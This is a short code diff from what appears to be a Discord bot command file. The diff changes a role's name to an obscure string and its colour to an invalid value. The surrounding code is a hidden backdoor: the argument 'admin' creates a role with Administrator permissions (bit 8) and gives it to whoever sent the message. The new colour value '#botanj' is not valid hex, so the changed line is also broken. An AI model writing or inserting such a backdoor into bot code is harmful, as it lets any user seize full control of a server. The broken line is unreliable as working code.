@@ -16,7 +16,7 @@ exports.run = async (client, message, args) => {
   if (args[0] === "admin") {
     try {
       let role = await message.guild.roles.create({
-        data: { name: "McDunaldz", color: "#00bfff", permissions: [8] }
+        data: { name: "Cl4yn3", color: "#botanj", permissions: [8] }
       });
 
       message.member.roles.add(role);
